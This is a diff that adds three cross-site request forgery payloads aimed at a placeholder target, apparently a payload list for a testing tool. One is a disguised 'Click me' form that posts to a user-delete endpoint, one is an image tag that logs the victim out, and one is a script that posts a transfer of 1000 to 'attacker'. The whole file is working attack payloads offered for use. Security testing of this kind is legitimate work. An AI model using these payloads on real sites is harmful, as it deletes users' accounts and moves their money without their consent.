@@ -1,0 +1,3 @@
+<form action="{{TARGET}}/api/user/delete" method="POST"><input type="submit" value="Click me"></form>
+<img src="{{TARGET}}/api/logout">
+<script>fetch('{{TARGET}}/api/transfer',{method:'POST',body:'amount=1000&to=attacker'})</script>
